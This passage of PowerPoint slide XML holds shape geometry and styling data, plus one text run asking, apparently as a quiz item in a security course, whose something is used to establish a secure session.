                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1089024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6076948" y="1089024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6076948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8" name="object 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1085760" y="3733920"/>
              <a:ext cx="6076440" cy="1088640"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6076440"/>
                <a:gd name="textAreaRight" fmla="*/ 6076800 w 6076440"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1088640"/>
                <a:gd name="textAreaBottom" fmla="*/ 1089000 h 1088640"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="6076950" h="1089025" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6076948" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6076948" y="1089024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="108902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5188726" name="object 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1164600" y="3675240"/>
            <a:ext cx="5852520" cy="165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12600">
              <a:lnSpc>
                <a:spcPts val="4260"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="261"/>
              </a:spcBef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Whose</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="36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36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36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36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used</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="36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26">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>to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establish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="36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36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secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="36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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>session?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518949" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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3AF0CF26-6514-4A19-8B51-116FCACC706B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32950758" name="object 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2027160" y="1805040"/>
            <a:ext cx="4068720" cy="2228400"/>
            <a:chOff x="2027160" y="1805040"/>
            <a:chExt cx="4068720" cy="2228400"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="43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2600280" y="1805040"/>
              <a:ext cx="1521000" cy="1550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3" name="object 4"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2045160" y="3434760"/>
              <a:ext cx="136080" cy="36612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366120"/>
                <a:gd name="textAreaBottom" fmla="*/ 366480 h 366120"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="136525" h="366395" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="68385" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1711" y="29371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="84628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58926" y="192965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10811" y="285243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27749" y="365907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129024" y="358606"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="136414" y="29371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6838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4" name="object 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2175840" y="3184200"/>
              <a:ext cx="545760" cy="83736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837360"/>
                <a:gd name="textAreaBottom" fmla="*/ 837720 h 837360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="546100" h="837564" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="464576" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="359755" y="29371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190111" y="36668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64510" y="95337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9099" y="182144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="248112"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3872" y="837189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="213899" y="837189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="215626" y="555363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="300485" y="524358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="300485" y="281368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="387521" y="277956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="402221" y="222262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="358049" y="191148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="304369" y="191148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="304369" y="104922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="536126" y="104922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="546023" y="91925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="464576" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="546100" h="837564" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="536126" y="104922"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="393110" y="104922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="426104" y="154480"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="492777" y="161850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="536126" y="104922"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="E59EB2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object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2383920" y="3706920"/>
              <a:ext cx="289800" cy="111960"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 289800"/>
                <a:gd name="textAreaRight" fmla="*/ 290160 w 28980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290194" h="112395" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="74079" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="20361" y="25417"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="77241"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="61084" y="110406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="164525" y="112119"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="289673" y="71563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="168047" y="12889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74079" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="A6FF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36" name="object 7"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2540880" y="3163320"/>
              <a:ext cx="184680" cy="183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37" name="object 8"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId5"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2279520" y="3330360"/>
              <a:ext cx="184680" cy="183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38" name="object 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2027160" y="3146040"/>
              <a:ext cx="710280" cy="875879"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 710280"/>
                <a:gd name="textAreaRight" fmla="*/ 710640 w 71028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710564" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="383565" y="506183"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="377063" y="491109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361480" y="485089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346341" y="491109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339407" y="506183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346341" y="521766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361480" y="528256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="377063" y="521766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="383565" y="506183"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710564" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="383565" y="438505"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="377063" y="422897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361480" y="416509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346341" y="422897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339407" y="438505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346341" y="454012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361480" y="460463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="377063" y="454012"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="383565" y="438505"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710564" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="383565" y="277088"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="377063" y="261581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361480" y="255092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346341" y="261581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339407" y="277088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="346341" y="292595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361480" y="299059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="377063" y="292595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="383565" y="277088"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710564" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="636473" y="112229"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="629539" y="96723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="614400" y="90220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="598792" y="96723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="592340" y="112229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="598792" y="127368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="614400" y="134226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="629539" y="127368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="636473" y="112229"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="710564" h="876300" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="710082" y="115633"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="707199" y="57873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="707097" y="55740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="707021" y="54356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="703008" y="44919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="696214" y="28943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="677989" y="9956"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="652043" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="618286" y="914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="576732" y="15621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="552411" y="28067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="526021" y="45351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="383565" y="50139"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="316522" y="62191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255435" y="84201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="215607" y="108343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="181825" y="139814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148031" y="195948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129921" y="268884"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="129120" y="285127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127762" y="284543"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127762" y="332447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127762" y="621563"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103428" y="631355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="82257" y="629653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="67564" y="617575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59728" y="597649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64503" y="542861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97396" y="485089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="80543" y="464794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="66675" y="444969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55854" y="426415"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47663" y="408292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39814" y="376313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41986" y="350431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54152" y="332308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74422" y="322872"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103428" y="323672"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127762" y="332447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127762" y="284543"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111721" y="277520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="69278" y="275348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33782" y="287439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19011" y="298259"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7747" y="311581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="327558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="386219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="22517" y="432447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42875" y="456145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54952" y="468236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="68834" y="480288"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="57569" y="490245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="30264" y="520407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10350" y="561873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6477" y="601624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15582" y="636143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35496" y="662813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64960" y="678853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="100012" y="681024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119468" y="676249"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127762" y="672122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="127762" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="172720" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="172720" y="290855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="181825" y="222745"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="208673" y="171805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="248945" y="135572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="298767" y="111315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="415175" y="89789"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="531685" y="88087"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="552843" y="70764"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="572770" y="57873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="607466" y="44919"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="636028" y="47967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="647725" y="55740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="657199" y="67348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="668921" y="92405"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670521" y="115633"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="670623" y="117017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="652043" y="159283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="616102" y="180809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="596176" y="180009"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="579755" y="170091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="577519" y="168757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="565010" y="151066"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550710" y="123837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="123050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="433031" y="212598"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="428485" y="208470"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="416521" y="197650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="387083" y="180441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="327329" y="169189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="300482" y="175691"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267144" y="203238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="247230" y="252476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="245071" y="269760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="246786" y="287439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257149" y="320687"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="302641" y="373341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="332917" y="386219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="365455" y="387565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="381381" y="382346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="397865" y="373341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="413473" y="360337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="419239" y="353047"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="427812" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="545553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="549605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="592848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="647293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="402653" y="644334"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="383616" y="634707"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="384822" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="390829" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="391833" y="605853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="592848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411289" y="549605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="361480" y="578281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339407" y="627037"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339407" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="382727" y="876058"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="382727" y="672236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="430784" y="687425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="509612" y="688771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="548093" y="681837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="585368" y="670661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="607352" y="661555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="623036" y="655066"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="641261" y="646049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="659371" y="636143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="643407" y="626135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624751" y="614959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="604380" y="603326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588581" y="594677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588581" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568058" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568058" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564565" y="632663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564565" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568058" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="568058" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564565" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564565" y="602107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588581" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588581" y="594677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="582320" y="591248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="574027" y="587375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="572643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="596074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="646506"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="499160" y="658456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="499160" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="499160" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="499160" y="587768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="503897" y="587743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="596074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="542505" y="572643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="534301" y="568807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="484936" y="551954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="550887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="587883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="660222"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="654596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="630466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="609371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434263" y="588111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="587883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="550887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477532" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="504825" y="342226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="533387" y="336626"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="544639" y="330174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="554545" y="321487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="567982" y="301231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="571969" y="277088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564680" y="254177"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="564565" y="253822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="545109" y="233883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="532485" y="228917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="532485" y="274116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="528637" y="290855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="503123" y="299059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="403923" y="300761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="387083" y="331876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367588" y="349161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="345528" y="353047"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="321208" y="343966"/>
                  </a:lnTo>
